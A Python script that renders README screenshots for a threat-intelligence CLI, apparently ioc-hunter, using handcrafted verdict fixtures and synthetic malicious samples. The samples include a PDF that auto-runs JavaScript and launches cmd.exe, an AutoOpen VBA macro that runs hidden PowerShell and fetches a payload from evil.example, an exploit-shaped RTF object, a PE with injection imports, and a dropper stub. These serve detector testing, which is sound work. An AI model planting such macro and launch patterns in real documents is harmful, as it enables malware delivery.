"""Render SVG "screenshots" of every CLI surface for the README.

We reuse the real `cli.py` render helpers against handcrafted IOCVerdict
fixtures so the screenshots match the live tool exactly. Rich's
`Console(record=True).save_svg()` produces a vector image — committable
to the repo, readable on GitHub, no PIL / no GUI required.

Run with: `python examples/render_screenshots.py`
"""

from __future__ import annotations

from pathlib import Path

from rich.console import Console
from rich.terminal_theme import MONOKAI

from ioc_hunter import cli
from ioc_hunter.core.eml import EmailAttachment, EmailReport
from ioc_hunter.core.types import IOC, IOCType
from ioc_hunter.correlator import Correlation
from ioc_hunter.scorer import IOCVerdict
from ioc_hunter.sources.base import SourceResult, Verdict
from ioc_hunter.watcher import WatchAlert

OUTPUT_DIR = Path(__file__).parent.parent / "docs" / "screenshots"
OUTPUT_DIR.mkdir(parents=True, exist_ok=True)


def _result(
    source: str,
    ioc_type: IOCType,
    ioc_value: str,
    verdict: Verdict,
    score: float = 0.0,
    tags: tuple[str, ...] = (),
    error: str | None = None,
) -> SourceResult:
    return SourceResult(
        source=source,
        ioc_type=ioc_type,
        ioc_value=ioc_value,
        verdict=verdict,
        score=score,
        tags=tags,
        error=error,
    )


def _record(name: str, render_fn) -> None:
    console = Console(record=True, width=100, force_terminal=True)
    # Swap the cli module's console for the recording one during rendering.
    original = cli.console
    cli.console = console
    try:
        render_fn(console)
    finally:
        cli.console = original
    out = OUTPUT_DIR / f"{name}.svg"
    console.save_svg(str(out), title=f"ioc-hunter {name}", theme=MONOKAI)
    print(f"wrote {out.relative_to(OUTPUT_DIR.parent.parent)}")


def _verdict_tor() -> IOCVerdict:
    ioc = IOC(value="185.220.101.42", type=IOCType.IPV4)
    return IOCVerdict(
        ioc=ioc,
        verdict=Verdict.MALICIOUS,
        confidence=0.46,
        results=(
            _result(
                "tor_exit", IOCType.IPV4, ioc.value, Verdict.SUSPICIOUS, 0.50, ("tor", "anonymizer")
            ),
            _result("urlhaus", IOCType.IPV4, ioc.value, Verdict.UNKNOWN),
            _result("threatfox", IOCType.IPV4, ioc.value, Verdict.UNKNOWN),
            _result(
                "abuseipdb",
                IOCType.IPV4,
                ioc.value,
                Verdict.MALICIOUS,
                1.00,
                ("country:DE", "usage:Commercial", "isp:Tor-Exit traffic"),
            ),
            _result(
                "otx",
                IOCType.IPV4,
                ioc.value,
                Verdict.MALICIOUS,
                1.00,
                ("Bruteforce", "SSH", "Honeypot"),
            ),
            _result(
                "virustotal",
                IOCType.IPV4,
                ioc.value,
                Verdict.MALICIOUS,
                0.15,
                ("suspicious-udp", "tor"),
            ),
        ),
        tags=("tor", "anonymizer", "country:DE", "Bruteforce", "SSH", "Honeypot"),
        references=(
            "https://check.torproject.org/torbulkexitlist",
            "https://www.abuseipdb.com/check/185.220.101.42",
            "https://otx.alienvault.com/indicator/IPv4/185.220.101.42",
        ),
    )


def _verdicts_scan() -> list[IOCVerdict]:
    def vd(
        value: str,
        type_: IOCType,
        verdict: Verdict,
        confidence: float,
        hits: int,
        total: int,
        tags: tuple[str, ...] = (),
    ) -> IOCVerdict:
        results = tuple(
            _result(f"src{i}", type_, value, verdict if i < hits else Verdict.UNKNOWN)
            for i in range(total)
        )
        return IOCVerdict(
            ioc=IOC(value=value, type=type_),
            verdict=verdict,
            confidence=confidence,
            results=results,
            tags=tags,
        )

    return [
        vd(
            "CVE-2024-21762",
            IOCType.CVE,
            Verdict.MALICIOUS,
            1.00,
            1,
            1,
            ("actively_exploited_kev", "fortigate"),
        ),
        vd(
            "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f",
            IOCType.SHA256,
            Verdict.MALICIOUS,
            0.48,
            4,
            4,
            ("windows", "malware", "ioc"),
        ),
        vd(
            "185.220.101.42",
            IOCType.IPV4,
            Verdict.MALICIOUS,
            0.46,
            6,
            6,
            ("tor", "anonymizer", "Bruteforce"),
        ),
        vd(
            "185.220.101.99",
            IOCType.IPV4,
            Verdict.MALICIOUS,
            0.46,
            6,
            6,
            ("tor", "anonymizer", "Bruteforce"),
        ),
        vd("8.8.8.8", IOCType.IPV4, Verdict.BENIGN, 0.37, 6, 6, ("country:US", "isp:Google LLC")),
        vd("evil.com", IOCType.DOMAIN, Verdict.MALICIOUS, 0.36, 4, 4, ("malware", "phishing")),
        vd("https://evil.com/login.php", IOCType.URL, Verdict.SUSPICIOUS, 0.13, 4, 4),
        vd("https://evil.com/install.exe", IOCType.URL, Verdict.UNKNOWN, 0.00, 4, 4),
        vd("bad@evil.com", IOCType.EMAIL, Verdict.UNKNOWN, 0.00, 1, 1),
    ]


def _correlations() -> list[Correlation]:
    url1 = IOC("https://evil.com/login.php", IOCType.URL)
    url2 = IOC("https://evil.com/install.exe", IOCType.URL)
    domain = IOC("evil.com", IOCType.DOMAIN)
    email = IOC("bad@evil.com", IOCType.EMAIL)
    ip1 = IOC("185.220.101.42", IOCType.IPV4)
    ip2 = IOC("185.220.101.99", IOCType.IPV4)
    return [
        Correlation(url1, domain, "url_to_host", "URL is hosted on evil.com"),
        Correlation(url2, domain, "url_to_host", "URL is hosted on evil.com"),
        Correlation(email, domain, "email_to_domain", "Email at evil.com"),
        Correlation(ip1, ip2, "shared_subnet", "both in 185.220.101.0/24"),
        Correlation(ip1, ip2, "shared_tag", "both tagged 'tor'"),
        Correlation(ip1, ip2, "shared_tag", "both tagged 'Bruteforce'"),
    ]


def render_check(console: Console) -> None:
    verdict = _verdict_tor()
    cli._render_verdict_panel(verdict)
    cli._render_per_source_table(verdict)
    cli._render_extras(verdict)


def render_scan(console: Console) -> None:
    verdicts = _verdicts_scan()
    console.print("Extracted [bold]10[/] IOC(s) from examples/sample-incident.txt")
    cli._render_batch_table(verdicts)


def render_correlate(console: Console) -> None:
    from rich.box import SIMPLE
    from rich.table import Table

    console.print("Extracted [bold]10[/] IOC(s)")
    edges = _correlations()
    table = Table(title=f"Correlations ({len(edges)})", box=SIMPLE)
    table.add_column("Kind", style="cyan")
    table.add_column("Source", overflow="fold")
    table.add_column("→", style="dim")
    table.add_column("Target", overflow="fold")
    table.add_column("Evidence", style="dim", overflow="fold")
    for e in edges:
        table.add_row(e.kind, cli._safe(e.source.value), "→", cli._safe(e.target.value), e.evidence)
    console.print(table)


def render_sources(console: Console) -> None:
    from rich.box import SIMPLE
    from rich.table import Table

    rows = [
        ("netmeta", "active", 0.20, "ipv4, ipv6", "no"),
        ("tor_exit", "active", 0.40, "ipv4, ipv6", "no"),
        ("urlhaus", "active", 0.85, "domain, ipv4, md5, sha256, url", "yes"),
        ("threatfox", "active", 0.85, "domain, email, ipv4, ipv6, md5, sha1, sha256, url", "yes"),
        ("abuseipdb", "active", 0.80, "ipv4, ipv6", "yes"),
        ("otx", "active", 0.75, "cve, domain, ipv4, ipv6, md5, sha1, sha256, url", "yes"),
        ("virustotal", "active", 0.90, "domain, ipv4, ipv6, md5, sha1, sha256, url", "yes"),
    ]
    table = Table(title="TI sources", box=SIMPLE)
    table.add_column("Source", style="cyan")
    table.add_column("Status")
    table.add_column("Weight", justify="right")
    table.add_column("Supports", style="dim", overflow="fold")
    table.add_column("Key required", style="dim")
    for name, status, weight, supports, req in rows:
        styled = f"[green]{status}[/]" if status == "active" else f"[yellow]{status}[/]"
        table.add_row(name, styled, f"{weight:.2f}", supports, req)
    console.print(table)


def render_decode(console: Console) -> None:
    from rich.box import SIMPLE
    from rich.table import Table

    table = Table(title="Magic decode — 2 candidate(s)", box=SIMPLE)
    table.add_column("Op", style="cyan")
    table.add_column("Score", justify="right")
    table.add_column("IOCs", justify="right")
    table.add_column("Decoded", overflow="fold")
    table.add_row("base64", "0.95", "2", "https://evil.com/login.php")
    table.add_row("rot13", "0.85", "0", "nUE0pUZ6Yl9yqzyfYzAioF9fo2qcov5jnUN=")
    console.print(table)


def _phishing_report() -> EmailReport:
    return EmailReport(
        subject="URGENT: Verify your account or it will be locked",
        from_addr="Bank Support <support@b4nk-secure.com>",
        reply_to="attacker@evil.example",
        return_path="<bounce@evil.example>",
        to_addrs=("victim@corp.example",),
        message_id="<deadbeef@evil.example>",
        date="Mon, 14 Jun 2026 12:00:00 +0000",
        received_chain=(
            "from mail.evil.example (mail.evil.example [185.220.101.5]) by mx.corp.example",
            "from outbound.evil.example (outbound [203.0.113.7]) by mail.evil.example",
        ),
        x_originating_ip="185.220.101.5",
        body_text="",
        body_html="",
        attachments=(
            EmailAttachment(
                filename="invoice.exe",
                content_type="application/octet-stream",
                size=46592,
                sha256="275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f",
                md5="44d88612fea8a8f36de82e1278abb02f",
            ),
        ),
        iocs=(
            IOC("185.220.101.5", IOCType.IPV4),
            IOC("203.0.113.7", IOCType.IPV4),
            IOC("attacker@evil.example", IOCType.EMAIL),
            IOC("evil.example", IOCType.DOMAIN),
            IOC("https://login.evil.example/verify", IOCType.URL),
            IOC("275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f", IOCType.SHA256),
            IOC("44d88612fea8a8f36de82e1278abb02f", IOCType.MD5),
        ),
    )


def render_parse_eml(console: Console) -> None:
    report = _phishing_report()
    cli._render_eml_summary(report)
    cli._render_eml_received_chain(report)
    cli._render_eml_attachments(report)
    console.print(f"\nExtracted [bold]{len(report.iocs)}[/] IOC(s) from .eml")
    verdicts = [
        IOCVerdict(
            ioc=IOC("185.220.101.5", IOCType.IPV4),
            verdict=Verdict.MALICIOUS,
            confidence=0.62,
            results=(),
            tags=("tor", "anonymizer", "Bruteforce"),
        ),
        IOCVerdict(
            ioc=IOC("203.0.113.7", IOCType.IPV4),
            verdict=Verdict.SUSPICIOUS,
            confidence=0.30,
            results=(),
            tags=("bogon", "test-net-3"),
        ),
        IOCVerdict(
            ioc=IOC("evil.example", IOCType.DOMAIN),
            verdict=Verdict.MALICIOUS,
            confidence=0.55,
            results=(),
            tags=("phishing", "malware"),
        ),
        IOCVerdict(
            ioc=IOC(
                "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f", IOCType.SHA256
            ),
            verdict=Verdict.MALICIOUS,
            confidence=0.48,
            results=(),
            tags=("emotet", "windows"),
        ),
        IOCVerdict(
            ioc=IOC("https://login.evil.example/verify", IOCType.URL),
            verdict=Verdict.MALICIOUS,
            confidence=0.51,
            results=(),
            tags=("phishing",),
        ),
    ]
    cli._render_batch_table(verdicts)


def render_watch(console: Console) -> None:
    from rich.panel import Panel

    console.print(
        Panel.fit(
            "[bold]Watching[/] /var/log/auth.log\n"
            "[dim]threshold:[/] suspicious  [dim]debounce:[/] 2.0s  [dim]from-start:[/] False\n"
            "[dim]Press Ctrl-C to stop.[/]",
            border_style="cyan",
        )
    )
    alerts = [
        WatchAlert(
            verdict=IOCVerdict(
                ioc=IOC("185.220.101.5", IOCType.IPV4),
                verdict=Verdict.MALICIOUS,
                confidence=0.62,
                results=(),
                tags=("tor", "anonymizer", "Bruteforce", "SSH"),
            ),
            source_line=(
                "Jun 14 14:03:21 web01 sshd[28471]: Failed password for root "
                "from 185.220.101.5 port 51234 ssh2"
            ),
        ),
        WatchAlert(
            verdict=IOCVerdict(
                ioc=IOC("evil.example", IOCType.DOMAIN),
                verdict=Verdict.SUSPICIOUS,
                confidence=0.40,
                results=(),
                tags=("phishing",),
            ),
            source_line=(
                "Jun 14 14:03:22 web01 nginx: 10.0.0.5 - - [14/Jun/2026:14:03:22] "
                '"GET /api/track?to=evil.example HTTP/1.1" 200'
            ),
        ),
    ]
    for alert in alerts:
        cli._render_alert(alert)


# ---------------------------------------------------------------------------
# Document & binary analyzer screenshots — phase 14.1 + 14.2
# ---------------------------------------------------------------------------


def _analyze_evil_pe(path: Path) -> None:
    """Build a synthetic 'evil' PE (process-injection imports + UPX-like
    RWX section) on disk."""
    import secrets
    import sys

    sys.path.insert(0, str(Path(__file__).parent.parent / "tests"))
    from _binary_fixtures import build_minimal_pe  # type: ignore[import-not-found]

    imports = [
        (
            "kernel32.dll",
            [
                "VirtualAllocEx",
                "WriteProcessMemory",
                "CreateRemoteThread",
                "OpenProcess",
                "LoadLibraryA",
            ],
        ),
        ("ntdll.dll", ["NtUnmapViewOfSection", "NtCreateThreadEx", "RtlCreateUserThread"]),
        ("advapi32.dll", ["AdjustTokenPrivileges", "OpenProcessToken", "LookupPrivilegeValueA"]),
    ]
    pe = build_minimal_pe(
        imports=imports,
        extra_section_name=b"UPX0\x00\x00\x00\x00",
        extra_section_data=secrets.token_bytes(8192),
        extra_section_chars=0xE0000020,
    )
    path.write_bytes(pe)


def _build_evil_pdf(path: Path) -> None:
    """Synthetic malicious PDF: OpenAction → JavaScript + Launch + EmbeddedFile."""
    import sys
    import zlib

    sys.path.insert(0, str(Path(__file__).parent.parent / "tests"))
    from test_analyze_pdf import build_minimal_pdf  # type: ignore[import-not-found]

    js_payload = b"var u='http://evil.example/p.exe'; eval(unescape('%75%6e%70%61%63%6b'));"
    compressed = zlib.compress(js_payload)
    objects = [
        b"<< /Type /Catalog /OpenAction 2 0 R /Pages 4 0 R /Names << /EmbeddedFiles 3 0 R >> >>",
        b"<< /S /JavaScript /JS (eval(this.getAnnots()[0].subject)) >>",
        b"<< /Type /Filespec /F (dropped.exe) /EF << /F 5 0 R >> >>",
        b"<< /Type /Pages /Count 1 /Kids [6 0 R] >>",
        b"<< /Filter [/ASCIIHexDecode /FlateDecode] /Length "
        + str(len(compressed)).encode()
        + b" >>\nstream\n"
        + compressed
        + b"\nendstream",
        b"<< /Type /Page /Parent 4 0 R /AA << /O 2 0 R >> >>",
        b"<< /S /Launch /F (cmd.exe) >>",
    ]
    path.write_bytes(build_minimal_pdf(objects=objects))


def _build_evil_docm(path: Path) -> None:
    """Synthetic .docm: AutoOpen VBA with WScript.Shell + PowerShell encoded
    command + external template-injection relationship (Follina-shape)."""
    import sys

    sys.path.insert(0, str(Path(__file__).parent.parent / "tests"))
    from _doc_fixtures import (  # type: ignore[import-not-found]
        build_compressed_atom,
        build_minimal_cfb,
        build_minimal_docm,
    )

    vba = (
        b"Sub AutoOpen()\n"
        b'    Set s = CreateObject("WScript.Shell")\n'
        b'    s.Run "powershell -EncodedCommand QQBBAEEAQQA= -windowstyle hidden"\n'
        b'    Set x = CreateObject("MSXML2.XMLHTTP")\n'
        b'    x.Open "GET", "http://evil.example/p.exe", False\n'
        b"End Sub\n"
    )
    module = b"\x00" * 0x100 + build_compressed_atom(vba)
    vba_project = build_minimal_cfb({"VBA/dir": b"x" * 5000, "VBA/Module1": module})
    docm = build_minimal_docm(
        with_vba=vba_project,
        external_rel_urls=["http://attacker.example/payload.dotm"],
    )
    path.write_bytes(docm)


def _build_evil_rtf(path: Path) -> None:
    """Synthetic .rtf: Equation Editor exploit object (CVE-2017-11882)
    with auto-fire \\objupdate trigger."""
    import sys

    sys.path.insert(0, str(Path(__file__).parent.parent / "tests"))
    from _doc_fixtures import build_minimal_cfb  # type: ignore[import-not-found]

    cfb = build_minimal_cfb({"Equation Native": b"\x42" * 5000})
    rtf = (
        b"{\\rtf1\\ansi\\deff0\n"
        b"{\\object\\objemb\\objupdate{\\*\\objclass Equation.3}"
        b"{\\*\\objdata " + cfb.hex().encode() + b"}}\n"
        b"}"
    )
    path.write_bytes(rtf)


def render_analyze(console: Console, sample_path: Path) -> None:
    """Drive the real ``analyze()`` pipeline and render with the same
    helpers the CLI uses."""
    from ioc_hunter.analyze import analyze as _analyze

    report = _analyze(sample_path)
    cli._render_analyze_header(report)
    cli._render_analyze_sections(report)
    cli._render_analyze_imports(report)
    cli._render_analyze_pcap(report)
    cli._render_analyze_archive(report)
    cli._render_analyze_findings(report)
    cli._render_analyze_iocs(report)


def _build_evil_pcap(path: Path) -> None:
    """Synthetic capture: beacon + DGA + plaintext FTP creds + TLS ClientHello
    + an HTTP GET — five separate signals so the panel shows everything."""
    import sys

    sys.path.insert(0, str(Path(__file__).parent.parent / "tests"))
    from _pcap_fixtures import (  # type: ignore[import-not-found]
        build_pcap,
        dns_query,
        dns_response,
        eth_ipv4_tcp,
        eth_ipv4_udp,
        http_request,
        krb_tcp,
        krb_tgs_rep,
        ntlm_authenticate,
        ntlm_challenge,
        smb2_session_setup,
        smb2_tree_connect,
        synth_tls_clienthello,
        synth_tls_serverhello,
    )

    frames: list = []
    # Beacon: 12 connections at a tight 60s cadence
    for i in range(12):
        frames.append(
            (
                100.0 + 60.0 * i + 0.02 * (i % 3),
                eth_ipv4_tcp("10.0.0.5", "203.0.113.10", 51000, 443, payload=b"X" * 16),
            )
        )
    # DGA-shaped DNS lookups
    for i, name in enumerate(
        [
            "vqxznmkpfhg.com",
            "rzxvbnmwerty.net",
            "kjhwbcxpvnzm.org",
            "btxkcnxrtgmd.io",
        ]
    ):
        frames.append(
            (10.0 + i, eth_ipv4_udp("10.0.0.5", "8.8.8.8", 50000 + i, 53, dns_query(name)))
        )
        frames.append(
            (
                10.0 + i + 0.05,
                eth_ipv4_udp("8.8.8.8", "10.0.0.5", 53, 50000 + i, dns_response(name)),
            )
        )
    # Real HTTP GET — surfaces Host + UA + URL via the IOC sweep
    frames.append(
        (
            20.0,
            eth_ipv4_tcp(
                "10.0.0.5",
                "203.0.113.20",
                52000,
                80,
                payload=http_request("GET", "track.attacker.tld", "/c2/checkin?id=abc"),
            ),
        )
    )
    # Plaintext FTP credentials
    frames.append(
        (
            30.0,
            eth_ipv4_tcp("10.0.0.5", "203.0.113.30", 53000, 21, payload=b"USER backup_admin\r\n"),
        )
    )
    frames.append(
        (30.1, eth_ipv4_tcp("10.0.0.5", "203.0.113.30", 53000, 21, payload=b"PASS hunter2\r\n"))
    )
    # TLS ClientHello with SNI → JA3, plus the ServerHello → JA3S
    ch = synth_tls_clienthello(sni="api.attacker.tld")
    frames.append((40.0, eth_ipv4_tcp("10.0.0.5", "203.0.113.40", 54000, 443, payload=ch)))
    sh = synth_tls_serverhello()
    frames.append((40.1, eth_ipv4_tcp("203.0.113.40", "10.0.0.5", 443, 54000, payload=sh)))
    # SMB lateral movement: TREE_CONNECT to an admin share
    frames.append(
        (
            50.0,
            eth_ipv4_tcp(
                "10.0.0.5", "10.0.0.20", 55000, 445, payload=smb2_tree_connect(r"\\FILES01\ADMIN$")
            ),
        )
    )
    # NTLM authentication captured in the clear → NetNTLMv2 hash
    frames.append(
        (
            50.1,
            eth_ipv4_tcp(
                "10.0.0.20", "10.0.0.5", 445, 55001, payload=smb2_session_setup(ntlm_challenge())
            ),
        )
    )
    frames.append(
        (
            50.2,
            eth_ipv4_tcp(
                "10.0.0.5",
                "10.0.0.20",
                55001,
                445,
                payload=smb2_session_setup(ntlm_authenticate("CORP", "svc_backup", "WKS31")),
            ),
        )
    )
    # Kerberoasting: TGS-REP issuing an RC4 service ticket
    frames.append(
        (
            60.0,
            eth_ipv4_tcp(
                "10.0.0.20", "10.0.0.5", 88, 56000, payload=krb_tcp(krb_tgs_rep(ticket_etype=23))
            ),
        )
    )
    path.write_bytes(build_pcap(frames))


def _build_evil_archive(path: Path) -> None:
    """A phishing-style zip: an executable payload, a benign decoy, and a
    nested zip hiding a capture that screams lateral movement."""
    import io
    import sys
    import zipfile

    sys.path.insert(0, str(Path(__file__).parent.parent / "tests"))
    from _pcap_fixtures import (  # type: ignore[import-not-found]
        build_pcap,
        eth_ipv4_tcp,
        smb2_tree_connect,
    )

    mal_pcap = build_pcap(
        [
            (
                1.0,
                eth_ipv4_tcp(
                    "10.0.0.5", "10.0.0.20", 50000, 445, payload=smb2_tree_connect(r"\\DC01\ADMIN$")
                ),
            )
        ]
    )
    inner = io.BytesIO()
    with zipfile.ZipFile(inner, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("incident_capture.pcap", mal_pcap)

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("Invoice_2026.pdf.js", b"var s = new ActiveXObject('WScript.Shell'); // dropper")
        z.writestr("readme.txt", b"Please enable content. Contact http://payment-portal.tld/login")
        z.writestr("evidence.zip", inner.getvalue())
    path.write_bytes(buf.getvalue())


if __name__ == "__main__":
    import tempfile

    _record("check", render_check)
    _record("scan-file", render_scan)
    _record("correlate", render_correlate)
    _record("sources", render_sources)
    _record("decode", render_decode)
    _record("parse-eml", render_parse_eml)
    _record("watch", render_watch)

    # Document / binary analyzer screenshots. We build the synthetic
    # sample, drive the real ``analyze()`` pipeline, then capture.
    with tempfile.TemporaryDirectory() as tmp:
        pe_path = Path(tmp) / "evil.exe"
        pdf_path = Path(tmp) / "evil.pdf"
        docm_path = Path(tmp) / "evil.docm"
        rtf_path = Path(tmp) / "evil.rtf"
        pcap_path = Path(tmp) / "evil.pcap"
        archive_path = Path(tmp) / "evil.zip"
        _analyze_evil_pe(pe_path)
        _build_evil_pdf(pdf_path)
        _build_evil_docm(docm_path)
        _build_evil_rtf(rtf_path)
        _build_evil_pcap(pcap_path)
        _build_evil_archive(archive_path)
        _record("analyze-pe", lambda c, p=pe_path: render_analyze(c, p))
        _record("analyze-pdf", lambda c, p=pdf_path: render_analyze(c, p))
        _record("analyze-docm", lambda c, p=docm_path: render_analyze(c, p))
        _record("analyze-rtf", lambda c, p=rtf_path: render_analyze(c, p))
        _record("analyze-pcap", lambda c, p=pcap_path: render_analyze(c, p))
        _record("analyze-archive", lambda c, p=archive_path: render_analyze(c, p))

    print(f"\nDone — {OUTPUT_DIR}")
